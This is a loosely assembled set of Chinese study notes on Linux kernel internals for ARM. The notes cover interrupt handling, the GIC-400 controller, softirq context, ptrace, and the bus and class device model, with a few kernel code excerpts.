因此，即便是打开了PREEMPT的选项，实际上linux系统的任务响应时间仍然是不确定的。一方面内核代码的临界区非常多，我们需要找到，系统中持有锁，或者禁止抢占的最大的时间片。另外一方面，在上图的T4中，能顺利的调度高优先级任务并非易事，这时候可能有触发的软中断，也可能有新来的中断，也可能某些driver的tasklet要执行，只有在没有任何bottom half的任务要执行的时候，调度器才会启动调度。 

ARM处理器有多种processor mode，例如user mode（用户空间的AP所处于的模式）、supervisor mode（即SVC mode，大部分的内核态代码都处于这种mode）、IRQ mode（发生中断后，处理器会切入到该mode）等。对于linux kernel，其中断处理处理过程中，ARM 处理器大部分都是处于SVC mode。但是，实际上产生中断的时候，ARM处理器实际上是进入IRQ mode，因此在进入真正的IRQ异常处理之前会有一小段IRQ mode的操作，之后会进入SVC mode进行真正的IRQ异常处理。由于IRQ mode只是一个过度，因此IRQ mode的栈很小，只有12个字节，
struct stack {
    u32 irq[3];
    u32 abt[3];
    u32 und[3];
} ____cacheline_aligned; 
 static struct stack stacks[NR_CPUS]; 
除了irq mode，linux kernel在处理abt mode（当发生data abort exception或者prefetch abort exception的时候进入的模式）和und mode（处理器遇到一个未定义的指令的时候进入的异常模式）的时候也是采用了相同的策略。也就是经过一个简短的abt或者und mode之后，stack切换到svc mode的栈上，这个栈就是发生异常那个时间点current thread的内核栈。anyway，在irq mode和svc mode之间总是需要一个stack保存数据，这就是中断模式的stack，系统初始化的时候，cpu_init函数中会进行中断模式stack的设定
 嵌入式汇编的语法格式是：asm(code : output operand list : input operand list : clobber list);大家对着上面的code就可以分开各段内容了。在input operand list中，有两种限制符（constraint），"r"或者"I"，"I"表示立即数（Immediate operands），"r"表示用通用寄存器传递参数。clobber list中有一个r14，表示在汇编代码中修改了r14的值，这些信息是编译器需要的内容。

对于SMP，bootstrap CPU会在系统初始化的时候执行cpu_init函数，进行本CPU的irq、abt和und三种模式的内核栈的设定，具体调用序列是：start_kernel--->setup_arch--->setup_processor--->cpu_init。对于系统中其他的CPU，bootstrap CPU会在系统初始化的最后，对每一个online的CPU进行初始化，具体的调用序列是：start_kernel--->rest_init--->kernel_init--->kernel_init_freeable--->kernel_init_freeable--->smp_init--->cpu_up--->_cpu_up--->__cpu_up。__cpu_up函数是和CPU architecture相关的。对于ARM，其调用序列是__cpu_up--->boot_secondary--->smp_ops.smp_boot_secondary(SOC相关代码)--->secondary_startup--->__secondary_switched--->secondary_start_kernel--->cpu_init。 
在使用了MMU之后，具体异常向量表放在那个物理地址已经不重要了，重要的是把它映射到0xffff0000的虚拟地址就OK了，具体代码如下：

    static void __init devicemaps_init(const struct machine_desc *mdesc)
    {
        ……
        vectors = early_alloc(PAGE_SIZE * 2); －－－－－分配两个page的物理页帧
        early_trap_init(vectors); －－－－－－－copy向量表以及相关help function到该区域
        ……
        map.pfn = __phys_to_pfn(virt_to_phys(vectors));
        map.virtual = 0xffff0000;
        map.length = PAGE_SIZE;
    #ifdef CONFIG_KUSER_HELPERS
        map.type = MT_HIGH_VECTORS;
    #else
        map.type = MT_LOW_VECTORS;
    #endif
        create_mapping(&map); －－－－－－－－－－映射0xffff0000的那个page frame
        if (!vectors_high()) {－－－如果SCTLR.V的值设定为low vectors，那么还要映射0地址开始的memory
            map.virtual = 0;
            map.length = PAGE_SIZE * 2;
            map.type = MT_LOW_VECTORS;
            create_mapping(&map);
        }
        map.pfn += 1;
        map.virtual = 0xffff0000 + PAGE_SIZE;
        map.length = PAGE_SIZE;
        map.type = MT_LOW_VECTORS;
        create_mapping(&map); －－－－－－－－－－映射high vecotr开始的第二个page frame
    ……
    }

当外设（SOC内部或者外部都可以）检测到了中断事件，就会通过interrupt requestion line上的电平或者边沿（上升沿或者下降沿或者both）通知到该外设连接到的那个中断控制器，而中断控制器就会在多个处理器中选择一个，并把该中断通过IRQ（或者FIQ，本文不讨论FIQ的情况）分发给该processor。ARM处理器感知到了中断事件后，会进行下面一系列的动作：
1、修改CPSR（Current Program Status Register）寄存器中的M[4:0]。M[4:0]表示了ARM处理器当前处于的模式（ processor modes）。ARM定义的mode包括： 
处理器模式 	缩写 	对应的M[4:0]编码 	Privilege level
User 		usr 	10000 			PL0
FIQ 		fiq 	10001 			PL1
IRQ 		irq 	10010 			PL1
Supervisor 	svc 	10011 			PL1
Monitor 	mon 	10110 			PL1
Abort 		abt 	10111 			PL1
Hyp 		hyp 	11010 			PL2
Undefined 	und 	11011 			PL1
System 		sys 	11111 			PL1 
 一旦设定了CPSR.M，ARM处理器就会将processor mode切换到IRQ mode。 

2、保存发生中断那一点的CPSR值（step 1之前的状态）和PC值
ARM处理器支持9种processor mode，每种mode看到的ARM core register（R0～R15，共计16个）都是不同的。每种mode都是从一个包括所有的Banked ARM core register中选取。全部Banked ARM core register包括

Usr 	System 	Hyp 	Supervisor 	abort 	undefined 	Monitor 	IRQ 	FIQ
R0_usr 	  	  	  	  	  	  	  	 
R1_usr 	  	  	  	  	  	  	  	 
R2_usr 	  	  	  	  	  	  	  	 
R3_usr 	  	  	  	  	  	  	  	 
R4_usr 	  	  	  	  	  	  	  	 
R5_usr 	  	  	  	  	  	  	  	 
R6_usr 	  	  	  	  	  	  	  	 
R7_usr 	  	  	  	  	  	  	  	 
R8_usr 	  	  	  	  	  	  	  				R8_fiq
R9_usr 	  	  	  	  	  	  	  				R9_fiq
R10_usr 	  	  	  	  	  	  	  			R10_fiq
R11_usr 	  	  	  	  	  	  	  			R11_fiq
R12_usr 	  	  	  	  	  	  	  			R12_fiq
SP_usr 	  	SP_hyp 	SP_svc 		SP_abt 	SP_und 		SP_mon 		SP_irq 	SP_fiq
LR_usr 	  	  	LR_svc 		LR_abt 	LR_und 		LR_mon 		LR_irq 	LR_fiq
PC 	  	  	  	  	  	  	  	 
CPSR 	  	  	  	  	  	  	  	 
  	  	SPSR_hyp SPSR_svc 	SPSR_abt SPSR_und 	SPSR_mon 	SPSR_irq SPSR_fiq
  	  	ELR_hyp 	  	  	  	  	  	  
在IRQ mode下，CPU看到的R0～R12寄存器、PC以及CPSR是和usr mode（userspace）或者svc mode（kernel space）是一样的。不同的是IRQ mode下，有自己的R13(SP，stack pointer）、R14（LR，link register）和SPSR（Saved Program Status Register）。 
CPSR是共用的，虽然中断可能发生在usr mode（用户空间），也可能是svc mode（内核空间），不过这些信息都是体现在CPSR寄存器中。硬件会将发生中断那一刻的CPSR保存在SPSR寄存器中（由于不同的mode下有不同的SPSR寄存器，因此更准确的说应该是SPSR-irq，也就是IRQ mode中的SPSR寄存器）。 
PC也是共用的，由于后续PC会被修改为irq exception vector，因此有必要保存PC值。当然，与其说保存PC值，不如说是保存返回执行的地址。对于IRQ而言，我们期望返回地址是发生中断那一点执行指令的下一条指令。具体的返回地址保存在lr寄存器中（注意：这个lr寄存器是IRQ mode的lr寄存器，可以表示为lr_irq）：
 （1）对于thumb state，lr_irq ＝ PC
（2）对于ARM state，lr_irq ＝ PC － 4 

contex-A9 的中断管理器gic模块
 GIC-V2支持的中断类型有下面几种：
（a）外设中断（Peripheral interrupt）。有实际物理interrupt request signal的那些中断，上面已经介绍过了。
（b）软件触发的中断（SGI，Software-generated interrupt）。软件可以通过写GICD_SGIR寄存器来触发一个中断事件，这样的中断，可以用于processor之间的通信。
（c）虚拟中断（Virtual interrupt）和Maintenance interrupt。这两种中断和本文无关，不再赘述。 
自外设的interrupt source输入信号。分成两种类型，分别是PPI（Private Peripheral Interrupt）和SPI（Shared Peripheral Interrupt）。其实从名字就可以看出来两种类型中断信号的特点，PPI中断信号是CPU私有的，每个CPU都有其特定的PPI信号线。而SPI是所有CPU之间共享的。通过寄存器GICD_TYPER可以配置SPI的个数（最多480个）。GIC-400支持多少个SPI中断，其输入信号线就有多少个SPI interrupt request signal。同样的，通过寄存器GICD_TYPER也可以配置CPU interface的个数（最多8个），GIC-400支持多少个CPU interface，其输入信号线就提供多少组PPI中断信号线。一组PPI中断信号线包括6个实际的signal：
（a）nLEGACYIRQ信号线。对应interrupt ID 31，在bypass mode下（这里的bypass是指bypass GIC functionality，直接连接到某个processor上），nLEGACYIRQ可以直接连到对应CPU的nIRQCPU信号线上。在这样的设置下，该CPU不参与其他属于该CPU的PPI以及SPI中断的响应，而是特别为这一根中断线服务。
（b）nCNTPNSIRQ信号线。来自Non-secure physical timer的中断事件，对应interrupt ID 30。
（c）nCNTPSIRQ信号线。来自secure physical timer的中断事件，对应interrupt ID 29。
（d）nLEGACYFIQ信号线。对应interrupt ID 28。概念同nLEGACYIRQ信号线，不再描述。
（e）nCNTVIRQ信号线。对应interrupt ID 27。Virtual Timer Event，和虚拟化相关，这里不与描述。
（f）nCNTHPIRQ信号线。对应interrupt ID 26。Hypervisor Timer Event，和虚拟化相关，这里不与描述。
对于Cortex A15的GIC实现，其PPI中断信号线除了上面的6个，还有一个叫做Virtual Maintenance Interrupt，对应interrupt ID 25。
对于Cortex A9的GIC实现，其PPI中断信号线包括5根：
（a）nLEGACYIRQ信号线和nLEGACYFIQ信号线。对应interrupt ID 31和interrupt ID 28。这部分和上面一致
（b）由于Cortext A9的每个处理器都有自己的Private timer和watch dog timer，这两个HW block分别使用了ID 29和ID 30
（c）Cortext A9内嵌一个global timer为系统内的所有processor共享，对应interrupt ID 27
关于private timer和global timer的描述，请参考时间子系统的相关文档。
关于一系列和虚拟化相关的中断，请参考虚拟化的系列文档。
（3）输出信号
所谓输出信号，其实就是GIC和各个CPU直接的接口，这些接口包括：
（a）触发CPU中断的信号。nIRQCPU和nFIQCPU信号线，熟悉ARM CPU的工程师对这两个信号线应该不陌生，主要用来触发ARM cpu进入IRQ mode和FIQ mode。
（b）Wake up信号。nFIQOUT和nIRQOUT信号线，去ARM CPU的电源管理模块，用来唤醒CPU的
（c）AXI slave interface signals。AXI（Advanced eXtensible Interface）是一种总线协议，属于AMBA规范的一部分。通过这些信号线，ARM CPU可以和GIC硬件block进行通信（例如寄存器访问）。
（4）中断号的分配
GIC-V2支持的中断类型有下面几种：
（a）外设中断（Peripheral interrupt）。有实际物理interrupt request signal的那些中断，上面已经介绍过了。
（b）软件触发的中断（SGI，Software-generated interrupt）。软件可以通过写GICD_SGIR寄存器来触发一个中断事件，这样的中断，可以用于processor之间的通信。
（c）虚拟中断（Virtual interrupt）和Maintenance interrupt。这两种中断和本文无关，不再赘述。
为了标识这些interrupt source，我们必须要对它们进行编码，具体的ID分配情况如下：
（a）ID0~ID31是用于分发到一个特定的process的interrupt。标识这些interrupt不能仅仅依靠ID，因为各个interrupt source都用同样的ID0~ID31来标识，因此识别这些interrupt需要interrupt ID ＋ CPU interface number。ID0~ID15用于SGI，ID16~ID31用于PPI。PPI类型的中断会送到其私有的process上，和其他的process无关。SGI是通过写GICD_SGIR寄存器而触发的中断。Distributor通过processor source ID、中断ID和target processor ID来唯一识别一个SGI。
（b）ID32~ID1019用于SPI。 这是GIC规范的最大size，实际上GIC-400最大支持480个SPI，Cortex-A15和A9上的GIC最多支持224个SPI。 

不同的GIC-V2的实现总会有一些不同，这些信息可以通过Device tree的机制来传递。Device node中定义了各种属性，其中就包括了memory资源，IRQ描述等信息，这些信息需要在初始化的时候传递给具体的驱动，因此需要一个Device node和driver模块的匹配过程。在Device Tree模块中会包括系统中所有的device node，如果我们的系统使用了GIC-400，那么系统的device node数据库中会有一个node是GIC-400的，一个示例性的GIC-400的device node（我们以瑞芯微的RK3288处理器为例）定义如下：
    gic: interrupt-controller@ffc01000 {
        compatible = "arm,gic-400";
        interrupt-controller;
        #interrupt-cells = <3>;
        #address-cells = <0>;

        reg = <0xffc01000 0x1000="">,－－－－Distributor address range
              <0xffc02000 0x1000="">,－－－－－CPU interface address range
              <0xffc04000 0x2000="">,－－－－－Virtual interface control block
              <0xffc06000 0x2000="">;－－－－－Virtual CPU interfaces
        interrupts = ;
    };
     void __init irqchip_init(void)
    {
        of_irq_init(__irqchip_begin);
    }
__irqchip_begin就是内核irq chip table的首地址，这个table也就保存了kernel支持的所有的中断控制器的ID信息（用于和device node的匹配）。of_irq_init函数执行之前，系统已经完成了device tree的初始化，因此系统中的所有的设备节点都已经形成了一个树状结构，每个节点代表一个设备的device node。of_irq_init是在所有的device node中寻找中断控制器节点，形成树状结构（系统可以有多个interrupt controller，之所以形成中断控制器的树状结构，是为了让系统中所有的中断控制器驱动按照一定的顺序进行初始化）。之后，从root interrupt controller节点开始，对于每一个interrupt controller的device node，扫描irq chip table，进行匹配，一旦匹配到，就调用该interrupt controller的初始化函数，并把该中断控制器的device node以及parent中断控制器的device node作为参数传递给irq chip driver。。具体的匹配过程的代码属于Device Tree模块的内容，
 我们首先看看这个函数的参数，node参数代表需要初始化的那个interrupt controller的device node，parent参数指向其parent。在映射GIC-400的memory map I/O space的时候，我们只是映射了Distributor和CPU interface的寄存器地址空间，和虚拟化处理相关的寄存器没有映射，因此这个版本的GIC driver应该是不支持虚拟化的（不知道后续版本是否支持，在一个嵌入式平台上支持虚拟化有实际意义吗？最先支持虚拟化的应该是ARM64+GICV3/4这样的平台）。

要了解cpu-offset属性，首先要了解什么是banked register。所谓banked register就是在一个地址上提供多个寄存器副本。比如说系统中有四个CPU，这些CPU访问某个寄存器的时候地址是一样的，但是对于banked register，实际上，不同的CPU访问的是不同的寄存器，虽然它们的地址是一样的。如果GIC没有banked register，那么需要提供根据CPU index给出一系列地址偏移，而地址偏移=cpu-offset * cpu-nr
 每个interrupt controller都会形成一个irq domain，负责解析其下游的interrut source。如果interrupt controller有级联的情况，那么一个非root interrupt controller的中断控制器也是其parent irq domain的一个普通的interrupt source。struct irq_domain定义如下：
    struct irq_domain {
    ……
        const struct irq_domain_ops *ops;
        void *host_data;
    ……
    };
 对于GIC支持的IRQ的数目，这里还要赘述几句。实际上并非GIC支持多少个HW interrupt ID，其就支持多少个IRQ。对于SGI，其处理比较特别，并不归入IRQ number中。因此，对于GIC而言，其SGI（从0到15的那些HW interrupt ID）不需要irq domain进行映射处理，也就是说SGI没有对应的IRQ number。如果系统越来越复杂，一个GIC不能支持所有的interrupt source（目前GIC支持1020个中断源，这个数目已经非常的大了），那么系统还需要引入secondary GIC，这个GIC主要负责扩展外设相关的interrupt source，也就是说，secondary GIC的SGI和PPI都变得冗余了（这些功能，primary GIC已经提供了）。这些信息可以协助理解代码中的hwirq_base的设定。
（d）通过Distributor中的寄存器可以控制送达CPU interface，中断来到了GIC的CPU interface是否可以真正送达CPU呢？也不一定，还有一道关卡，也就是CPU interface中的Interrupt Priority Mask Register。这个寄存器设定了一个中断优先级的值，只有中断优先级高过该值的中断请求才会被送到CPU上去。我们在前面初始化的时候，给每个interrupt ID设定的缺省优先级是0xa0，这里设定的priority filter的优先级值是0xf0。数值越小，优先级越过。因此，这样的设定就是让所有的interrupt source都可以送达CPU，在CPU interface这里不做控制了。 
 对于GIC而言，其中断状态有四种：
中断状态 	描述
Inactive 	中断未触发状态，该中断即没有Pending也没有Active
Pending 	由于外设硬件产生了中断事件（或者软件触发）该中断事件已经通过硬件信号通知到GIC，等待GIC分配的那个CPU进行处理
Active 	CPU已经应答（acknowledge）了该interrupt请求，并且正在处理中
Active and Pending 	当一个中断源处于Active状态的时候，同一中断源又触发了中断，进入pending状态
processor ack了一个中断后，该中断会被设定为active。当处理完成后，仍然要通知GIC，中断已经处理完毕了。这时候，如果没有pending的中断，GIC就会将该interrupt设定为inactive状态。操作GIC中的End of Interrupt Register可以完成end of interrupt事件通知。 
4、BSP（bootstrap processor）之外，其他CPU的callback函数
对于multi processor系统，不可能初始化代码在所有的processor上都执行一遍，实际上，系统的硬件会选取一个processor作为引导处理器，我们称之BSP。这个processor会首先执行，其他的CPU都是处于reset状态，等到BSP初始化完成之后，release所有的non-BSP，这时候，系统中的各种外设硬件条件和软件条件（例如per CPU变量）都准备好了，各个non-BSP执行自己CPU specific的初始化就OK了。
上面描述的都是BSP的初始化过程，具体包括：
    ……
        gic_dist_init(gic);－－－－－－初始化GIC的Distributor
        gic_cpu_init(gic);－－－－－－初始化BSP的CPU interface
        gic_pm_init(gic);－－－－－－初始化GIC的Power management
    ……
对于GIC的Distributor和Power management，这两部分是全局性的，BSP执行初始化一次就OK了。对于CPU interface，每个processor负责初始化自己的连接的那个CPU interface HW block。我们用下面这个图片来描述这个过程： 
 booting
  假设CPUx被选定为BSP，那么第三章描述的初始化过程在该CPU上欢畅的执行。这时候，被初始化的GIC硬件包括：root GIC的Distributor、root GIC CPU Interface x（连接BSP的那个CPU interface）以及其他的级联的非root GIC（上图中绿色block，当然，我偷懒，没有画non-root GIC）。
BSP初始化完成之后，各个其他的CPU运行起来，会发送CPU_STARTING消息给关注该消息的模块。毫无疑问，GIC driver模块当然要关注这样的消息，在初始化过程中会注册callback函数如下：
    register_cpu_notifier(&gic_cpu_notifier);
GIC相关的回调函数定义如下：

    static struct notifier_block gic_cpu_notifier = {
        .notifier_call = gic_secondary_init,
        .priority = 100,
    };

    static int gic_secondary_init(struct notifier_block *nfb, unsigned long action,  void *hcpu)
    {
        if (action == CPU_STARTING || action == CPU_STARTING_FROZEN)
            gic_cpu_init(&gic_data[0]);－－－－－－－－－初始化那些非BSP的CPU interface
        return NOTIFY_OK;
    }

因此，当non-BSP booting up的时候，发送CPU_STARTING消息，调用GIC的callback函数，对上图中的紫色的CPU Interface HW block进行初始化，这样，就完成了全部GIC硬件的初始化过程。 
 
当网卡控制器的FIFO收到的来自以太网的数据的时候（例如半满的时候，可以软件设定），可以将该事件通过irq signal送达Interrupt Controller。Interrupt Controller可以把中断分发给系统中的Processor A or B。
NIC的中断处理过程大概包括：mask and ack interrupt controller-------->ack NIC-------->copy FIFO to ram------>handle Data in the ram----------->unmask interrupt controller
我们先假设Processor A处理了这个网卡中断事件，于是NIC的中断handler在Processor A上欢快的执行，这时候，Processor A的本地中断是disable的。NIC的中断handler在执行的过程中，网络数据仍然源源不断的到来，但是，如果NIC的中断handler不操作NIC的寄存器来ack这个中断的话，NIC是不会触发下一次中断的。还好，我们的NIC interrupt handler总是在最开始就会ack，因此，这不会导致性能问题。ack之后，NIC已经具体再次trigger中断的能力。当Processor A上的handler 在处理接收来自网络的数据的时候，NIC的FIFO很可能又收到新的数据，并trigger了中断，这时候，Interrupt controller还没有umask，因此，即便还有Processor B（也就是说有处理器资源），中断控制器也无法把这个中断送达处理器系统。因此，只能眼睁睁的看着NIC FIFO填满数据，数据溢出，或者向对端发出拥塞信号，无论如何，整体的系统性能是受到严重的影响。
注意：对于新的interrupt controller，可能没有mask和umask操作，但是原理是一样的，只不过NIC的handler执行完毕要发生EOI而已。
要解决上面的问题，最重要的是尽快的执行完中断handler，打开中断，unmask IRQ（或者发送EOI），方法就是把耗时的handle Data in the ram这个步骤踢出handler，让其在bottom half中执行。  

 三、理解softirq需要的基础知识（各种context）
1、preempt_count
为了更好的理解下面的内容，我们需要先看看一些基础知识：一个task的thread info数据结构定义如下（只保留和本场景相关的内容）：

    struct thread_info { 
        ……
        int            preempt_count;    /* 0 => preemptable, <0 => bug */
        ……
    };

preempt_count这个成员被用来判断当前进程是否可以被抢占。如果preempt_count不等于0（可能是代码调用preempt_disable显式的禁止了抢占，也可能是处于中断上下文等），说明当前不能进行抢占，如果preempt_count等于0，说明已经具备了抢占的条件（当然具体是否要抢占当前进程还是要看看thread info中的flag成员是否设定了_TIF_NEED_RESCHED这个标记，可能是当前的进程的时间片用完了，也可能是由于中断唤醒了优先级更高的进程）。 具体preempt_count的数据格式可以参考下图：
preempt_count:
reservebits	bit21		bit20		bit16~19	bit9~15	bit8	bit0~7
		preempt_active	NMI_flag	hardirq_count	softing_count	preemption_count
preemption count用来记录当前被显式的禁止抢占的次数，也就是说，每调用一次preempt_disable，preemption count就会加一，调用preempt_enable，该区域的数值会减去一。preempt_disable和preempt_enable必须成对出现，可以嵌套，最大嵌套的深度是255。
hardirq count描述当前中断handler嵌套的深度。对于ARM平台的linux kernel，其中断部分的代码如下：
    void handle_IRQ(unsigned int irq, struct pt_regs *regs)
    {
        struct pt_regs *old_regs = set_irq_regs(regs);

        irq_enter(); 
        generic_handle_irq(irq);

        irq_exit();
        set_irq_regs(old_regs);
    }
通用的IRQ handler被irq_enter和irq_exit这两个函数包围。irq_enter说明进入到IRQ context，而irq_exit则说明退出IRQ context。在irq_enter函数中会调用preempt_count_add(HARDIRQ_OFFSET)，为hardirq count的bit field增加1。在irq_exit函数中，会调用preempt_count_sub(HARDIRQ_OFFSET)，为hardirq count的bit field减去1。hardirq count占用了4个bit，说明硬件中断handler最大可以嵌套15层。在旧的内核中，hardirq count占用了12个bit，支持4096个嵌套。当然，在旧的kernel中还区分fast interrupt handler和slow interrupt handler，中断handler最大可以嵌套的次数理论上等于系统IRQ的个数。在实际中，这个数目不可能那么大（内核栈就受不了），因此，即使系统支持了非常大的中断个数，也不可能各个中断依次嵌套，达到理论的上限。基于这样的考虑，后来内核减少了hardirq count占用bit数目，改成了10个bit（在general arch的代码中修改为10，实际上，各个arch可以redefine自己的hardirq count的bit数）。但是，当内核大佬们决定废弃slow interrupt handler的时候，实际上，中断的嵌套已经不会发生了。因此，理论上，hardirq count要么是0，要么是1。不过呢，不能总拿理论说事，实际上，万一有写奇葩或者老古董driver在handler中打开中断，那么这时候中断嵌套还是会发生的，但是，应该不会太多（一个系统中怎么可能有那么多奇葩呢？呵呵），因此，目前hardirq count占用了4个bit，应付15个奇葩driver是妥妥的。
对softirq count进行操作有两个场景：
（1）也是在进入soft irq handler之前给 softirq count加一，退出soft irq handler之后给 softirq count减去一。由于soft irq handler在一个CPU上是不会并发的，总是串行执行，因此，这个场景下只需要一个bit就够了，也就是上图中的bit 8。通过该bit可以知道当前task是否在sofirq context。
（2）由于内核同步的需求，进程上下文需要禁止softirq。这时候，kernel提供了local_bf_enable和local_bf_disable这样的接口函数。这部分的概念是和preempt disable/enable类似的，占用了bit9～15，最大可以支持127次嵌套。 
 2、一个task的各种上下文
看完了preempt_count之后，我们来介绍各种context：
    #define in_irq()        (hardirq_count())
    #define in_softirq()        (softirq_count())
    #define in_interrupt()        (irq_count())
    #define in_serving_softirq()    (softirq_count() & SOFTIRQ_OFFSET)
这里首先要介绍的是一个叫做IRQ context的术语。这里的IRQ context其实就是hard irq context，也就是说明当前正在执行中断handler（top half），只要preempt_count中的hardirq count大于0（＝1是没有中断嵌套，如果大于1，说明有中断嵌套），那么就是IRQ context。
softirq context并没有那么的直接，一般人会认为当sofirq handler正在执行的时候就是softirq context。这样说当然没有错，sofirq handler正在执行的时候，会增加softirq count，当然是softirq context。不过，在其他context的情况下，例如进程上下文中，有有可能因为同步的要求而调用local_bh_disable，这时候，通过local_bh_disable/enable保护起来的代码也是执行在softirq context中。当然，这时候其实并没有正在执行softirq handler。如果你确实想知道当前是否正在执行softirq handler，in_serving_softirq可以完成这个使命，这是通过操作preempt_count的bit 8来完成的。
所谓中断上下文，就是IRQ context ＋ softirq context＋NMI context。 
关于开发中断的kernel-API 架构 workqueue softirq tasklet waitlist!!



















http://www.wowotech.net/device_model/bus.html
bus设备:
 subsys、devices_kset、drivers_kset是三个kset，由"Linux设备模型(2)_Kobject”中对kset的描述可知，kset是一个特殊的kobject，用来集合相似的kobject，它在sysfs中也会以目录的形式体现。其中subsys，代表了本bus（如/sys/bus/spi），它下面可以包含其它的kset或者其它的kobject；devices_kset和drivers_kset则是bus下面的两个kset（如/sys/bus/spi/devices和/sys/bus/spi/drivers），分别包括本bus下所有的device和device_driver。

interface是一个list head，用于保存该bus下所有的interface。有关interface的概念后面会详细介绍。 
 bus和class指针，分别保存上层的bus或者class指针。 

 bus_add_device的处理逻辑：

    调用内部的device_add_attrs接口，将由bus->dev_attrs指针定义的默认attribute添加到内核中，它们会体现在/sys/devices/xxx/xxx_device/目录中
    调用sysfs_create_link接口，将该device在sysfs中的目录，链接到该bus的devices目录下，例如：

    xxx# ls /sys/bus/spi/devices/spi1.0 -l                                                        
    lrwxrwxrwx root     root              2014-04-11 10:46 spi1.0 -> ../../../devices/platform/s3c64xx-spi.1/spi_master/spi1/spi1.0
    其中/sys/devices/…/spi1.0，为该device在sysfs中真正的位置，而为了方便管理，内核在该设备所在的bus的xxx_bus/devices目录中，创建了一个符号链接
    调用sysfs_create_link接口，在该设备的sysfs目录中（如/sys/devices/platform/alarm/）中，创建一个指向该设备所在bus目录的链接，取名为subsystem，例如：

    xxx # ls /sys/devices/platform/alarm/subsystem -l                                                
    lrwxrwxrwx root     root              2014-04-11 10:28 subsystem -> ../../../bus/platform
    最后，毫无疑问，要把该设备指针保存在bus->priv->klist_devices中

 bus_add_driver的处理逻辑：

    为该driver的struct driver_private指针（priv）分配空间，并初始化其中的priv->klist_devices、priv->driver、priv->kobj.kset等变量，同时将该指针保存在device_driver的p处
    将driver的kset（priv->kobj.kset）设置为bus的drivers kset（bus->p->drivers_kset），这就意味着所有driver的kobject都位于bus->p->drivers_kset之下（寄/sys/bus/xxx/drivers目录下）
    以driver的名字为参数，调用kobject_init_and_add接口，在sysfs中注册driver的kobject，体现在/sys/bus/xxx/drivers/目录下，如/sys/bus/spi/drivers/spidev
    将该driver保存在bus的klist_drivers链表中，并根据drivers_autoprobe的值，选择是否调用driver_attach进行probe
    调用driver_create_file接口，在sysfs的该driver的目录下，创建uevent attribute
    调用driver_add_attrs接口，在sysfs的该driver的目录下，创建由bus->drv_attrs指针定义的默认attribute
    同时根据suppress_bind_attrs标志，决定是否在sysfs的该driver的目录下，创建bind和unbind attribute（具体可参考"Linux设备模型(5)_device和device driver”中的介绍） 






trace处理	有一个debug linux用户程序的手段
Linux的内核提供了ptrace这样的系统调用，通过它，一个进程（我们称之 tracer，例如strace、gdb）可以观测和控制另外一个进程（被trace的进程，我们称之tracee）的执行。一旦Tracer和 tracee建立了跟踪关系，那么所有发送给tracee的信号(除SIGKILL)都会汇报给Tracer，以便Tracer可以控制或者观测 tracee的执行。例如断点的操作。Tracer程序一般会提供界面，以便用户可以设定一个断点（当tracee运行到断点时，会停下来）。当用户设定 了断点后，tracer就会保存该位置的指令，然后向该位置写入SWI __ARM_NR_breakpoint（这种断点是soft break point，可以设定无限多个，对于hard break point是和CPU体系结构相关，一般支持2个）。当执行到断点位置的时候，发生软中断，内核会给tracee进程发出SIGTRAP信号，当然这个信号也会被tracer捕获。对于tracee，当收到信号的时候，无论是什么信号，甚至是ignor的信号，tracee进程都会停止运行。Tracer进程可以对tracee进行各种操作，例如观察tracer的寄存器，观察变量等等。 










struct class是class的抽象，它的定义如下：
   1: /* include/linux/device.h, line 332 */
   2: struct class {
   3:         const char              *name;
   4:         struct module           *owner;
   5:  
   6:         struct class_attribute          *class_attrs;
   7:         struct device_attribute         *dev_attrs;
   8:         struct bin_attribute            *dev_bin_attrs;
   9:         struct kobject                  *dev_kobj;
  10:  
  11:         int (*dev_uevent)(struct device *dev, struct kobj_uevent_env *env);
  12:         char *(*devnode)(struct device *dev, umode_t *mode);
  13:  
  14:         void (*class_release)(struct class *class);
  15:         void (*dev_release)(struct device *dev);
  16:  
  17:         int (*suspend)(struct device *dev, pm_message_t state);
  18:         int (*resume)(struct device *dev);
  19:  
  20:         const struct kobj_ns_type_operations *ns_type;
  21:         const void *(*namespace)(struct device *dev);
  22:  
  23:         const struct dev_pm_ops *pm;
  24:  
  25:         struct subsys_private *p;
  26: };
    其实struct class和struct bus很类似，解释如下：
    name，class的名称，会在“/sys/class/”目录下体现。
    class_atrrs，该class的默认attribute，会在class注册到内核时，自动在“/sys/class/xxx_class”下创建对应的attribute文件。
    dev_attrs，该class下每个设备的attribute，会在设备注册到内核时，自动在该设备的sysfs目录下创建对应的attribute文件。
    dev_bin_attrs，类似dev_attrs，只不过是二进制类型attribute。
    dev_kobj，表示该class下的设备在/sys/dev/下的目录，现在一般有char和block两个，如果dev_kobj为NULL，则默认选择char。
    dev_uevent，当该class下有设备发生变化时，会调用class的uevent回调函数。
    class_release，用于release自身的回调函数。
    dev_release，用于release class内设备的回调函数。在device_release接口中，会依次检查Device、Device Type以及Device所在的class，是否注册release接口，如果有则调用相应的release接口release设备指针。
    p，和“Linux设备模型(6)_Bus”中struct bus结构一样，不再说明。

    device的注册最终是由device_add接口（drivers/base/core.c）实现了，该接口中和class有关的动作包括：

        调用device_add_class_symlinks接口，创建3.1小节描述的各种符号链接，即：在对应class的目录下，创建指向device的符号链接；在device的目录下，创建名称为subsystem、指向对应class目录的符号链接
        调用device_add_attrs，添加由class指定的attributes（class->dev_attrs）
        如果存在对应该class的add_dev回调函数，调用该回调函数
依旧没有弄清楚class在内核到底是怎么使用的









电源管理有关的Source code分别位于：

    kernel/power/ *
    drivers/power/
    drivers/base/power/*
    drivers/cpuidle/*
    drivers/cpufreq/*
    drivers/devfreq/*
    include/linux/power_supply.h
    include/linux/cpuidle.h
    include/linux/cpufreq.h
    include/linux/cpu_pm.h
    include/linux/device.h
    include/linux/pm.h
    include/linux/pm domain.h
    include/linux/pm runtime.h
    include/linux/pm wakeup.h
    include/linux/suspend.h
    Documentation/power/*.txt



































































































































(USB IN Endpoint 1,video streaming interface 1)
